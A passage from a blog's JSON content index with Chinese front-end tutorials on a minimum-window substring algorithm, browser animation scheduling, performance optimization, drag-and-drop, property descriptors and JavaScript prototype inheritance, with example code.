1，如果减 1 后仍大于等于 0（说明是 T 中的字符），count 自增 1 完全找到每个 T 中的每个字符时，HashMap 中 在 T 中的每个字符对应的值为 0，其余的值为负数 此时 count === T.length，找到覆盖子串 左指针向右移动从覆盖子串中寻找最小覆盖子串，并将每次匹配到的覆盖子串的结果保存下来 左指针向右移动时，HashMap 中每个字符自加1 如果是 T 中的字符，则自加后值为 1 （-n…0 –&gt; 1），自加后如果小于等于 0 ，说明之前的覆盖子串中有相同的字符，剔除该字符后依然是覆盖子串 如果不是 T 中的字符，则自加后值为 0 （-n…-1 –&gt; 0），左指针继续向右移动，寻找更短的覆盖子串 123456789101112131415161718192021222324252627282930function fn(s, t) &#123; let size = t.length; let map = &#123;&#125;; // 存储目标串 t 中每个字符出现的次数 let left = 0; // 左指针 let count = 0; // 目标串 t 中每个字符出现一次加 1，当 `count === size` 时，出现覆盖子串（需进一步找出最小覆盖子串） let minLen = Number.MAX_VALUE; // 覆盖子串的长度 let res = &#x27;&#x27;; // 保存最小覆盖子串结果 for (let i = 0; i &lt; size; i++) &#123; map[t[i]] = +map[t[i]] ? map[t[i]] + 1 : 1; &#125; for (let i = 0; i &lt; s.length; i++) &#123; if (--map[s[i]] &gt;= 0) count++; while (count === size) &#123; if (minLen &gt; i - left + 1) &#123; minLen = i - left + 1; res = s.substr(left, minLen); &#125; if (++map[s[left]] &gt; 0) count--; left++; &#125; &#125; return res;&#125;console.log(fn(&#x27;ADCAFEGGD&#x27;, &#x27;ACE&#x27;)); // CAFE console.log(fn(&#x27;ADOBDCODEBANC&#x27;, &#x27;ABC&#x27;)); // BANCconsole.log(fn(&#x27;aa&#x27;, &#x27;aa&#x27;)); // aa","categories":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/categories/%E7%AE%97%E6%B3%95%E9%A2%98/"}],"tags":[{"name":"算法题","slug":"算法题","permalink":"https://xuxb.github.io/tags/%E7%AE%97%E6%B3%95%E9%A2%98/"},{"name":"技巧篇","slug":"技巧篇","permalink":"https://xuxb.github.io/tags/%E6%8A%80%E5%B7%A7%E7%AF%87/"}]},{"title":"requestAnimationFrame 与 requestIdleCallback","slug":"HTML/requestAnimationFrame 与 requestIdleCallback","date":"2021-05-24T08:32:28.000Z","updated":"2021-06-07T11:40:14.884Z","comments":true,"path":"2021/05/24/HTML/requestAnimationFrame 与 requestIdleCallback/","link":"","permalink":"https://xuxb.github.io/2021/05/24/HTML/requestAnimationFrame%20%E4%B8%8E%20requestIdleCallback/","excerpt":"","text":"requestAnimationFrame 与 requestIdleCallback1、requestAnimationFramerequestAnimationFrame() 方法告诉浏览器您希望执行动画，并请求浏览器调用指定的函数在下一次重绘之前更新动画。该方法使用一个回调函数作为参数，这个回调函数会在浏览器重绘之前调用。 CSS 变换和动画的优势在于浏览器知道动画什么时候开始，因此会计算出正确的循环间隔，在恰当的时候刷新 UI。而对于 JavaScript 动画，浏览器无从知晓什么时候开始。 requestAnimationFrame 会把每一帧中的所有DOM操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的 CPU、GPU 和内存使用量。 使用 setTimeout 或 setInterval 定义动画会有一些问题：如果队列前面已经加入了其他任务，那动画代码就要等前面的任务完成后再执行。简言之，以毫秒表示的延迟时间并不代表到时候一定会执行动画代码，而仅代表到时候会把代码添加到任务队列中。如果 UI 线程繁忙，比如忙于处理用户操作，那么即使把代码加入队列也不会立即执行。 requestAnimationFrame 是由浏览器专门为动画提供的API，在运行时浏览器会自动优化方法的调用，并且如果页面不是激活状态下的话，动画会自动暂停，有效节省了 CPU 开销，采用系统时间间隔，保持最佳绘制效率，不会因为间隔时间过短，造成过度绘制，增加开销；也不会因为间隔时间太长，使用动画卡顿不流畅，让各种网页动画效果能够有一个统一的刷新机制，从而节省系统资源，提高系统性能，改善视觉效果 12345678function updateProgress()&#123; var div = document.getElementById(&quot;status&quot;); div.style.width = (parseInt(div.style.width, 10) + 5) + &quot;%&quot;; if (div.style.left != &quot;100%&quot;)&#123; requestAnimationFrame(updateProgress); &#125;&#125;requestAnimationFrame(updateProgress); 2、requestIdleCallbackwindow.requestIdleCallback(fn) 会在浏览器空闲时期依次调用函数，这就可以让开发者在主事件循环中执行后台或低优先级的任务，而且不会对像动画和用户交互这样延迟触发而且关键的事件产生影响。函数一般会按先进先调用的顺序执行，除非函数在浏览器调用它之前就到了它的超时时间。","categories":[{"name":"HTML","slug":"HTML","permalink":"https://xuxb.github.io/categories/HTML/"}],"tags":[{"name":"HTML","slug":"HTML","permalink":"https://xuxb.github.io/tags/HTML/"}]},{"title":"前端性能优化","slug":"HTML/前端性能优化 - 通用篇","date":"2021-05-24T08:32:28.000Z","updated":"2021-06-07T11:38:00.296Z","comments":true,"path":"2021/05/24/HTML/前端性能优化 - 通用篇/","link":"","permalink":"https://xuxb.github.io/2021/05/24/HTML/%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%20-%20%E9%80%9A%E7%94%A8%E7%AF%87/","excerpt":"","text":"前端性能优化一、代码层面1.1 减少 DOM 元素DOM 元素越多、越复杂，则 DOM 操作（即重绘、重排）会越慢 优化方式： 可以使用伪元素、阴影、CSS 实现的内容尽量不要使用 DOM 实现 按需加载，减少不必要的渲染 结构合理，语义化标签 1.2 降低 CSS 选择器的复杂性CSS 选择器的匹配规则是是从右往左的，即先找到符合条件的元素，然后再匹配父元素进行过滤（why? 符合条件的元素远少于不符合条件的元素，可以节约性能） 所以有如下注意事项： 不给ID分类和Class分类添加标签名；（会增加一次过滤） 用子代选择器代替后代选择器；（避免无效的遍历） 用Class分类代替子代选择器；（避免多次遍历） 特殊类别可使用属性选择器；（避免多次遍历） 正确使用可继承的属性；（可从父元素传到子元素） 尽量避免通配符；（首先会遍历所有的元素，然后再过滤） 1.2 尽可能使用 flex 布局尽量使用 flex 代替浮动、表格等布局，后者会更耗性能且不易维护 1.3 使用字体图标代替图片字体图标就是将图标制作成一个字体，使用时就跟字体一样，可以设置属性，例如 font-size、color 等，而且字体图标是矢量图，不会失真，生成的文件也较小。 1.4 合理使用 will-change告知浏览器该元素会有哪些变化的方法，这样浏览器可以在元素属性真正发生变化之前提前做好对应的优化准备工作 1.5 使用 content-visibilitycontent-visibility 属性接受多个值，其中 auto 是可立即提高性能的属性。一个具有 content-visibility: auto 属性的元素可以获得布局、样式和绘制的限制（区域），如果元素不在屏幕上，这不会渲染其后代。浏览器在不考虑元素任何内容的情况下确定元素的大小，在此处则跳过大多数渲染。 1.6 使用 CSS3 GPU 加速 在 GPU 渲染的过程中，一些元素会因为符合了某些规则，而被提升为独立的层（黄色边框部分），一旦独立出来，就不会影响其它 DOM 的布局，所以我们可以利用这些规则，将经常变换的 DOM 主动提升到独立的层，那么在浏览器的一帧运行中，就可以减少 Layout 和 Paint 的时间了 CSS 中的以下几个属性能触发硬件加速： transform opacity filter will-change 1.7 避免过多的回流与重绘 重绘（reflow）：重新绘制（如改变某个元素的颜色、背景，并没有使布局改变） 重排（repaint）：重新生成布局（如改变某个元素的位置，导致布局改变，同时触发 重排、重绘） 相对于 Object、Array 操作，DOM 上的操作会慢上几个数量级，即使现代浏览器已经对 DOM 操作（重排、重绘）做了无数优化。所以大部分时候，Web 性能的瓶颈通常在渲染上。 DOM 操作很慢，绝大部分时候是指 DOM 操作所产生的副作用慢（主要是导致了重排），在页面上的任何操作都是有代价的 说明： 样式表越简单，重排和重绘就越快； 重排和重绘的 DOM 元素层级越高，成本就越高； &lt;table&gt; 元素的重排和重绘成本高于 &lt;div&gt; 元素 优化方式： 批量读写：统一读取属性，然后统一修改 DOM ，减少渲染次数 使用 DOM 片段 document.createDocumentFragment() 多次访问同一 DOM 应用局部变量缓存 操作元素时先隐藏，修改完元素后再显示 将元素的 position 属性为 absolute 或 fixed 的元素 使用 window.requestAnimationFrame()、window.requestIdleCallback() 调节重新渲染 使用虚拟 DOM 技术，如 React、Vue 1.8 使用 preload、prefetch &lt;link rel=&quot;preload&quot;&gt;&lt;/link&gt;用于本页面要用到的关键资源，包括关键js、字体、css文件。preload将会把资源得下载顺序权重提高，使得关键数据提前下载好，优化页面打开速度 &lt;link rel=&quot;prefetch&quot;&gt;&lt;/link&gt;用于加速未来页面里的资源，被标记为 prefetch 的资源，将会被浏览器在空闲时间加载，下载顺序权重比较低 1.9 使用 requestAnimationFrame 优化动画使用 setTimeout 或 setInterval 来实现动画的话，回调函数将在帧中的某个时点运行，可能刚好在末尾，可能经常丢失帧，导致卡顿，requestAnimationFrame 会在浏览器下一次重绘前执行，能使动画看上去更加流畅（PS: 当然最好的方式是使用 CSS3 动画） 1.10 使用虚拟列表虚拟列表其实是按需显示的一种实现，即只对可见区域进行渲染，对非可见区域中的数据不渲染或部分渲染的技术，从而达到极高的渲染性能。详情请看文章末尾的相关链接。 1.11 防抖、节流用于 onresize、onkeydown 等频繁触发的事件中，可减少请求、DOM 操作等，改善用户体验 防抖：在多次触发中(还没执行)，只执行最后一个触发。 节流：在一段时间内，只能执行一次。 1.12 图片优化 图片延迟加载：只加载可视区内的图片，根据 getBoundingClientRect() 来判断 响应式图片：够根据屏幕大小自动加载合适的图片，可通过 &lt;picture&gt; 或 @media 来实现 图片压缩：在可接受的范围内压缩图片，压缩后通常能减少 30% 左右的大小，且肉眼看上去无差异 使用 webp 格式的图片：更优的图像数据压缩算法，相比于传统 JPEG、PNG 图片，Webp 可以让图片大小平均减少 70% 左右。 合理使用图片、背景图：装饰性的图片应该使用 CSS 的 background-image 标签，而不是使用 img 标签 img 标签 DOM 解析完后去加载图片，图片加载失败时会显示一个撕裂的小图标标记，兼顾 SEO 和标签语义化时应该使用 background-image 内引用的图片会在该规则生效时，才会去下载该图片（有点类似于按需加载），图片加载失败时不会显示异常 1.13 使用骨架屏提前占好位置，当资源加载完成即可填充，减少页面的回流与重绘，同时还能给用户最直接的反馈，主要用于提升用户体验。 1.14 预渲染、服务端渲染（SSR） 有利于 SEO 有利于首屏渲染，提升用户体验 说明：请权衡利弊后，再酌情使用！！ 二、webpack 相关2.1 Tree Sharking用于消除无用的 js 代码，ES6模块依赖关系是确定的，和运行时的状态无关，可以进行可靠的静态分析，这就是 Tree Sharking 的基础 2.2 代码拆分使用 webpack 提供的 optimization.splitChunks 属性，主要作用是提取公共代码，防止代码被重复打包，拆分过大的js文件，合并零散的js文件等。 2.3 使用外部扩展 externals防止将某些 import 的包打包到 bundle 中，而是在运行时再去从外部获取这些扩展依赖。通过这种方式引入的依赖库，不需要 webpack 处理，编译进文件中，在我们需要，使用它的时候可以通过CMD、AMD、或者 window 全局方式访问 例如，可以通过 CDN 去引入 React &lt;script crossorigin src=&quot;https://unpkg.com/react@17/umd/react.production.min.js&quot;&gt;&lt;/script&gt; 2.4 动态 import()webpack 提供了动态加载的 import() 方法，可以实现按需加载我们的代码，并且使用了 promise 式的回调，获取加载的包。在代码中所有被 import() 的模块，都将打成一个单独的包，用于实现页面或组件的按需加载。 2.5 动态 polyfill 为了浏览器的兼容性，我们常常引入各种 polyfill，但是在构建时静态地引入 polyfill 存在一些问题，比如对于机型和浏览器版本比较新的用户来说，他们完全不需要 polyfill，引入 polyfill 对于这部分用户来说是多余的，从而造成体积变大和性能损失 动态 polyfill 指的是根据不同的浏览器，动态载入需要的 polyfill。 Polyfill.io 通过尝试使用 polyfill 重新创建缺少的功能，可以更轻松地支持不同的浏览器，并且可以大幅度的减少构建体积。 原理：根据你的浏览器 UA 头，判断你是否支持某些特性，从而返回给你一个合适的 polyfill。对于最新的 Chrome 浏览器来说，不需要任何 polyfill，所以返回的内容为空。如在 html 文件中引入 &lt;script crossorigin=&quot;anonymous&quot; src=&quot;https://polyfill.io/v3/polyfill.js&quot;&gt;&lt;/script&gt; 三、HTTP 层面3.1 减少 HTTP 请求数一个完整的 HTTP 请求需要经历 DNS 查找，TCP 握手，浏览器发出 HTTP 请求，服务器接收请求，服务器处理请求并发回响应，浏览器接收响应等过程，而如果文件较小，则真正下载数据的时间占比就越小，将多个小文件合并为一个大文件，从而减少 HTTP 请求次数，能提高此比例 每个请求都是有成本的，DNS寻址、与服务器建立连接、发送数据、等待服务器响应、接收数据复杂的过程。（使用缓存功能） 每个请求都需要携带数据，每个请求都需要占用带宽（合并请求，如多个图片合并成一张大图）。 浏览器进行并发请求的请求数是有上限的，因此请求数多了以后，浏览器需要分批进行请求，因此会增加用户的等待时间。（懒加载，只在必要的时机加载） 3.2 启用 gzip 压缩许多网络服务器可以通过调用第三方模块或使用内置程序将文件压缩为 gzip 格式，然后再发送该压缩文件以供下载。这样可以在下载呈现网站所需的资源时节省一些时间。 Gzip通常将响应大小减少约 70％ 3.3 改善服务器响应时间将服务器响应时间控制在 200ms 以内。有很多潜在因素都可能会延缓服务器响应，例如应用逻辑缓慢、数据库查询缓慢、路由缓慢、框架、库、资源CPU不足或内存不足等。 3.4 使用 CDN 加速可降低网络的拥塞状况、提高请求的响应速度，也能够减少源站的负载压力 3.5 合理的 HTTP 缓存策略尽可能利用缓存，对于文件名中有 hash 值时，设置强缓存，如设置 cache-control: max-age=2592000 (1个月，或者半年、一年等) 3.6 域名分片、域名收敛域名分片：把页面资源拆分成多个域名进行访问，从而提高页面加载速度。原因在于 Web 浏览器会限制每个域名的并发数量，如 6 个（浏览器有并发限制，是为了防止 DDOS攻击），当并行下载文件超过最大并发数就需要排队等待，如果有多个域名，则每个域名都可以发起 6 个 HTTP 请求，提高并发量。另外，不同的域名也可以防止 cookie 污染。（PS: 主要运用于 PC 端） 域名收敛：将静态资源放在一个域名下不进行发散，主要是为了适应移动端的发展需求，通常 DNS 是一个开销较大的操作，而移动端由于网络带宽和实时性、资源等的限制，这些开销对移动端的用户体验是致命的，因此需要进行域名收敛。（PS: 主要运用于移动端） 3.7 使用 HTTP2 二进制分帧 多路复用 首部压缩 流量控制 … 详细介绍可看下面的相关链接部分 相关链接 content-visibility window.requestAnimationFrame 高性能渲染十万条数据(虚拟列表) CDN原理简析 一文读懂 HTTP/2 特性","categories":[{"name":"面试题","slug":"面试题","permalink":"https://xuxb.github.io/categories/%E9%9D%A2%E8%AF%95%E9%A2%98/"}],"tags":[{"name":"面试题","slug":"面试题","permalink":"https://xuxb.github.io/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"}]},{"title":"拖放功能","slug":"HTML/拖放功能","date":"2021-05-24T08:32:28.000Z","updated":"2021-06-07T11:40:36.023Z","comments":true,"path":"2021/05/24/HTML/拖放功能/","link":"","permalink":"https://xuxb.github.io/2021/05/24/HTML/%E6%8B%96%E6%94%BE%E5%8A%9F%E8%83%BD/","excerpt":"","text":"拖放功能1、HTML5 拖放功能1.1 说明 ondragstart 事件: 作用于被拖拽元素上，当拖拽元素开始被拖拽的时候触发（回调函数中可设置需要传递的数据） ondragover 事件: 作用于目标元素上，拖拽元素在目标元素上移动时触发 （默认无法将元素 A 拖拽到元素 B 上，需调用 e.prentDefault() 方法，才能触发 ondrop 事件） ondrop 事件：作用于目标元素上，被拖拽的元素在目标元素上且鼠标放开时触发 （drop事件的默认行为是以链接形式打开, 需调用 e.prentDefault() 方法，回调函数中可添加被拖拽元素作为子元素） dataTransfer 对象：用于从被拖拽元素到目标元素间传递数据（拥有setData()、getData() 方法，只能传递字符串） 1.2 事件列表在拖动目标上触发事件 (源元素): ondragstart - 用户开始拖动元素时触发 ondrag - 元素正在拖动时触发 ondragend - 用户完成元素拖动 释放目标时触发的事件: ondragenter - 当被鼠标拖动的对象进入其容器范围内时触发此事件 ondragover - 当某被拖动的对象在另一对象容器范围内拖动时触发此事件 ondragleave - 当被鼠标拖动的对象离开其容器范围内时触发此事件 ondrop - 在一个拖动过程中，释放鼠标键时触发此事件 1.3 示例123456789101112131415&lt;div ondrop=&quot;drop(event)&quot; ondragover=&quot;allowDrop(event)&quot;&gt;&lt;/div&gt;&lt;img src=&quot;abc.gif&quot; draggable=&quot;true&quot; ondragstart=&quot;drag(event)&quot; /&gt;&lt;script&gt; allowDrop(e) &#123; e.preventDefault(); &#125; drag(e) &#123; e.dataTransfer.setData(&quot;content&quot;, &#x27;11111&#x27;); &#125; drop(e) &#123; e.preventDefault(); var data = e.dataTransfer.getData(&quot;content&quot;); &#125;&lt;/script&gt; 2、通过鼠标事件模拟拖放功能2.1 实现步骤 监听被拖拽元素的 onmousedown 事件 在 onmousedown 事件事件触发时，保存元素的左上角与鼠标点击的位置的修正偏移量（getBoundingClientRect() 与 event.clientX/clientY） 设置被拖拽元素为 position: absolute，在之后位置改变时，会以文档左上角为标准，方便计算距离 在 onmousedown 中监听 document 元素的 onmousemove 事件（监听 document 会更可靠） 在 onmousedown 处理程序中，计算元素相对于文档的偏移量（event.pageX/pageY 与修正偏移量的差值） 设置被拖拽元素的 top、left 的值 mousemove 会经常被触发，但不会针对每个像素都如此。因此在快速移动之后，光标可以从文档中心的某个地方（甚至是窗口外）从球上跳出来。因此为了捕获它，我们应该监听 document。 2.2 示例12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; #app &#123; width: 1000px; height: 550px; margin: 0 auto; border: 1px solid #ccc; &#125; #content &#123; width: 800px; height: 300px; margin: 100px auto; background: #eee; &#125; #ball &#123; display: inline-block; width: 40px; height: 40px; border-radius: 50%; background: #900; cursor: pointer; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;app&quot;&gt; &lt;div id=&quot;content&quot; class=&quot;droppable&quot;&gt;&lt;/div&gt; &lt;span id=&quot;ball&quot;&gt;&lt;/span&gt; &lt;/div&gt; &lt;script&gt; let offset = null; // 鼠标点击的位置与元素左上角的偏移量 let currentDroppable = null; const ball = document.querySelector(&#x27;#ball&#x27;); const onmousemove = function(event) &#123; ball.style.left = event.pageX - offset.x + &#x27;px&#x27;; ball.style.top = event.pageY - offset.y + &#x27;px&#x27;; // 查找是否有目标元素 ball.style.display = &#x27;none&#x27;; const belowEle = document.elementFromPoint(event.clientX, event.clientY); ball.style.display = &#x27;inline-block&#x27;; if (!belowEle) return; const droppableBelow = belowEle.closest(&#x27;.droppable&#x27;); if (currentDroppable != droppableBelow) &#123; if (currentDroppable) &#123; ball.style.opacity = &#x27;1&#x27;; &#125; currentDroppable = droppableBelow; if (currentDroppable) &#123; ball.style.opacity = &#x27;0.5&#x27;; &#125; &#125; &#125; ball.addEventListener(&#x27;mousedown&#x27;, function(event) &#123; ball.style.position = &#x27;absolute&#x27;; offset = &#123; x: event.clientX - ball.getBoundingClientRect().left, y: event.clientY - ball.getBoundingClientRect().top &#125; document.addEventListener(&#x27;mousemove&#x27;, onmousemove); &#125;); ball.addEventListener(&#x27;mouseup&#x27;, function(event) &#123; document.removeEventListener(&#x27;mousemove&#x27;, onmousemove); ball.onmouseup = null; &#125;); ball.ondragstart = function() &#123; return false; &#125;; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML","slug":"HTML","permalink":"https://xuxb.github.io/categories/HTML/"}],"tags":[{"name":"HTML","slug":"HTML","permalink":"https://xuxb.github.io/tags/HTML/"}]},{"title":"","slug":"Web 安全/JWT","date":"2021-04-30T08:57:41.918Z","updated":"2021-04-30T08:57:41.918Z","comments":true,"path":"2021/04/30/Web 安全/JWT/","link":"","permalink":"https://xuxb.github.io/2021/04/30/Web%20%E5%AE%89%E5%85%A8/JWT/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"JavaScript 属性描述符","slug":"JavaScript/JavaScript 属性描述符","date":"2021-04-27T12:24:48.000Z","updated":"2021-04-27T12:03:52.318Z","comments":true,"path":"2021/04/27/JavaScript/JavaScript 属性描述符/","link":"","permalink":"https://xuxb.github.io/2021/04/27/JavaScript/JavaScript%20%E5%B1%9E%E6%80%A7%E6%8F%8F%E8%BF%B0%E7%AC%A6/","excerpt":"","text":"属性描述符用来描述属性的属性 数据属性 value：该属性对应的值 writable：该属性是否可写 enumerable：该属性是否能被枚举（ for...in 循环和 Object.keys() ） configurable：该属性是否可配置（控制 writable、enumerable等属性） 访问器属性 set()：调用赋值运算符时，执行对应的方法 get()：调用.运算符时，执行对应的方法 note：value、writable 不可与 set()、get() 同时存在 12345678910111213141516var obj = &#123; name: &quot;xxb&quot;&#125;;Object.defineProperty(obj, &quot;age&quot;, &#123; enumerable: true, configurable: true, get: function () &#123; console.log(&quot;---&quot;); return 18; &#125;, set: function (newVal) &#123; console.log(&quot;+++++&quot;); &#125;&#125;);obj.age = 1231231;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://xuxb.github.io/categories/JavaScript/"}],"tags":[{"name":"JavaScript 基础","slug":"JavaScript-基础","permalink":"https://xuxb.github.io/tags/JavaScript-%E5%9F%BA%E7%A1%80/"}]},{"title":"原型链与继承","slug":"JavaScript/原型链与继承","date":"2021-04-27T12:24:48.000Z","updated":"2021-05-11T02:41:54.358Z","comments":true,"path":"2021/04/27/JavaScript/原型链与继承/","link":"","permalink":"https://xuxb.github.io/2021/04/27/JavaScript/%E5%8E%9F%E5%9E%8B%E9%93%BE%E4%B8%8E%E7%BB%A7%E6%89%BF/","excerpt":"","text":"原型链与继承1、原型链在面向类的语言中，类可以被复制（或实例化）多次，实例化（或者继承）一个类就意味着“把类的 行为复制到物理对象中”，对于每一个新实例来说都会重复这个过程。 在 JavaScript 中，并没有类似的复制机制。Javascript 中不能创建一个类的多个实例，只能创建多个对象，它们的 [[Prototype]] 关联的是同一个对象，这样一个对象就可以通过委托访问另一个对象的属性和函数。 JavaScript 中父类和子类的关系只存在于两者构造函数对应的 .prototype 对象中，它们的构造函数之间并不存在直接联系 JavaScript 中的函数无法真正地复制，只能复制对共享函数对象的引用，JavaScript 对象有一个特殊的 [[Prototype]] 内置属性，其实就是对于其他对象的引用。几乎所有的对象在创建时 [[Prototype]] 属性都会被赋予一个非空的值。 函数本身并不是构造函数，然而，当在普通的函数调用前面加上 new 关键字之后，就会把这个函数调用变成一个“构造函数 调用”。实际上， new 会劫持所有普通函数并用构造对象的形式来调用它。在 JavaScript 中对于“构造函数”最准确的解释是，所有带 new 的函数调用。 new Foo() 这个函数调用实际上并没有直接创建关联，这个关联只是一个意外的副作用（新创建的对象添加了 __proto__ 属性）， new Foo() 只是间接完成了目标：一个关联到其他对象的新对象。更直接的方式是使用 Object.create(...)。 JavaScript 的 [[Prototype]] 机制本质上就是行为委托机制：[[Prototype]] 存在于对象中的一个内部链接，它会引用其他对象。通常来说，这个链接的作用是：如果在对象上没有找到需要的属性或者方法引用，引擎就会继续在 [[Prototype]] 关联的对象上进行查找。同理，如果在后者中也没有找到需要的引用就会继续查找它的 [[Prototype]] ，以此类推。这一系列对象的链接被称为“原型链”。 123456789101112131415161718function Foo(name) &#123; this.name = name;&#125;Foo.prototype.myName = function() &#123; return this.name;&#125;;var a = new Foo( &quot;a&quot; );var b = new Foo( &quot;b&quot; );a.myName(); // &quot;a&quot;b.myName(); // &quot;b&quot;a.constructor === Foo // true// 看起来创建 `a` 和 `b` 时会把 `Foo.prototype` 对象复制到这两个对象中，然而事实并不是这样，// 在创建的过程中， `a` 和 `b` 的内部 [[Prototype]] 都会关联到 `Foo.prototype` 上。// 当 `a` 和 `b` 中无法找到 `myName` 时，它会在 `Foo.prototype` 上找到。// 看起来 `a.constructor === Foo` 为真意味着 `a` 确实有一个指向 `Foo` 的 `.constructor` 属性，// 但是事实不是这样，实际上， `.constructor` 引用同样被委托给了 `Foo.prototype` ，而`Foo.prototype.constructor` 默认指向 `Foo` 2、属性遍历使用 for...in 遍历对象时原理和查找 [[Prototype]] 链类似，任何可以通过原型链访问到且 enumerable: true 的属性都会被枚举。使用 in 操作符检查属性在对象中是否存在时，也会查找对象的整条原型链（无论属性是否可枚举） 123456789101112131415var obj = &#123; name: &#x27;xxb&#x27;&#125;;Object.defineProperty(obj, &#x27;age&#x27;, &#123; age: 24, enumerable: false&#125;)for (let key in obj) &#123; console.log(key);&#125;console.log(&#x27;age&#x27; in obj);console.log(&#x27;toString&#x27; in obj); 3、属性设置与屏蔽在于原型链上层时 obj.foo = “bar” 会出现的三种情况。 如果在 [[Prototype]] 链上层存在名为 foo 的普通数据访问属性并且 writable: true ，那就会直接在 obj 中添加一个名为 foo 的新属性，它是屏蔽属性。 如果在 [[Prototype]] 链上层存在 foo ，但 writable:false，那么无法修改已有属性或者在 obj 上创建屏蔽属性。如果运行在严格模式下，代码会抛出一个错误。否则，这条赋值语句会被忽略。总之，不会发生屏蔽。 如果在 [[Prototype]] 链上层存在 foo 并且它是一个 setter，那就一定会调用这个 setter。 foo 不会被添加到obj ，也不会重新定义 foo 这个 setter。 [[Prototype]] 链上层的只读属性会阻止 [[Prototype]] 链下层隐式创建（屏蔽）同名属性。这样做主要是为了模拟类属性的继承，比如父类的属性只读级别，则子类的属性应该不高于只读级别。 解决第2、3种情况可使用 Object.defineProperty() , 而不是使用 = 赋值 123456789// 情形1 生成屏蔽属性var parent = &#123; name: &#x27;aaaa&#x27;&#125;;var son = Object.create(parent);son.name = &#x27;bbbb&#x27;;console.log(son.name); 123456789// 情形2 赋值时报错var parent = &#123;&#125;;Object.defineProperty(parent, &#x27;name&#x27;, &#123; value: &#x27;aaa&#x27;, writable: false&#125;)var son = Object.create(parent);son.name = &#x27;bbbb&#x27;; // TypeError: Cannot assign to read only property &#x27;name&#x27; of object &#x27;#&lt;Object&gt;&#x27; 12345678910111213141516// 情形3 赋值失败并执行 `set()`var parent = &#123;&#125;;Object.defineProperty(parent, &#x27;name&#x27;, &#123; set () &#123; console.log(&#x27;set&#x27;); &#125;&#125;)var son = Object.create(parent);son.name = &#x27;bbbb&#x27;; console.log(son.name);// ----- output -----// set// undefined 4、proto 属性浏览器支持一种非标准的方法来访问内部 [[Prototype]] 属性， .__proto__ 的实现大致如下： 123456789Object.defineProperty(Object.prototype, &quot;__proto__&quot;, &#123; get: function() &#123; return Object.getPrototypeOf( this ); &#125;, set: function(o) &#123; Object.setPrototypeOf(this, o); return o; &#125;&#125;); 可使用 Object.getPrototypeOf()、Object.setPrototypeOf() 替代 5、实现继承的几种方式5.1 使用混入方式实现继承123456789101112131415161718192021222324function mixin (sourceObj, targetObj) &#123; for (let k in sourceObj) &#123; if (!targetObj[k]) &#123; targetObj[k] = sourceObj[k]; &#125; &#125; return targetObj;&#125;var Person = &#123; name: &#x27;nobody&#x27;, showName () &#123; console.log(this.name); &#125;&#125;var stu = mixin(Person, &#123; name: &#x27;xxb&#x27;, age: 24, showAge () &#123; console.log(this.age); &#125;&#125;)stu.showName(); 5.2 使用对象委托实现继承12345678910111213141516171819202122232425262728var Person = &#123; init (name) &#123; this.name = name; &#125;, showName () &#123; console.log(this.name); &#125;&#125;;var Student = Object.create(Person);Student.init = function (name, age) &#123; Person.init.call(this, name); this.age = age;&#125;;Student.showAge = function () &#123; console.log(this.age);&#125;;var stu = Object.create(Student);stu.init(&#x27;xxb&#x27;, 24);stu.showName();// `Object.create()` 会创建一个新对象并把它关联到指定的对象就可以充分发挥 [[Prototype]] 机制的作用（委托），// 并且避免不必要的麻烦（如使用 `new` 的构造函数调用会生成 `.prototype` 和 `.constructor` 引用）。// `Object.create() `没有其他副作用，ES6添加了辅助函数 `Object.setPrototypeOf()` ，用以实现同样的功能 5.3 使用原型链继承1234567891011121314151617181920212223242526272829function Person (name) &#123; this.name = name;&#125;Person.prototype.showName = function () &#123; console.log(this.name);&#125;function Student (name, age) &#123; Person.call(this, name); this.age = age;&#125;Student.prototype = Object.create(Person.prototype);Student.prototype.constructor = Student;Student.prototype.showAge = function () &#123; console.log(this.age);&#125;var stu = new Student(&#x27;xxb&#x27;, 24);stu.showName();// 如果使用 `Student.prototype = Person.prototype` 并不会创建一个关联到 `Student.prototype` 的新对象，// 它只是让 `Student.prototype` 直接引用 `Person.prototype` 对象。// 因此当执行类似 `Student.prototype.show = ... ` 的赋值语句时会直接修改 `Person.prototype` 对象本身。// 显然这不是想要的结果，否则根本不需要 `Student` 对象，直接使用 `Person` 就行了。// 如果使用 `Student.prototype = new Person()` 的确会创建一个关联到 `Student.prototype` 的新对象。// 但是它使用了 `Person()` 的“构造函数调用”，如果函数 `Person` 有一些副作用（比如给 this 添加数据属性、修改状态、注册到其他对象等）的话，就会影响到 `Student()` 的“后代” 5.4 使用 class 实现继承12345678910111213141516171819202122// 使用 es6 的 `class` 实现继承class Person &#123; constructor (name) &#123; this.name = name; &#125; showName () &#123; console.log(this.name); &#125;&#125;class Student extends Person &#123; constructor (name, age) &#123; super(name); this.age = age; &#125; showAge () &#123; console.log(this.age); &#125;&#125;var stu = new Student(&#x27;xxb&#x27;, 24);stu.showAge(); class 的优点： 不需要引用 .prototype 对象； 不需要通过 Object.create() 来替换 .prototype 对象，也不需要设置 .__proto__ 或者 Object.setPrototypeOf() 来指定原型链； 可以通过 super() 来实现相对多态，这样任何方法都可以引用原型链上层的同名方法。 class 字面语法不能声明属性（只能声明方法），避免原型链末端的“实例”可能会意外地获取 其他地方的属性； 可以通过 extends 很自然地扩展对象（子）类型，甚至是内置的对象（子）类型。 class 的缺点： class 基本上只是现有 [[Prototype]] 委托机制的一种语法糖。即 class 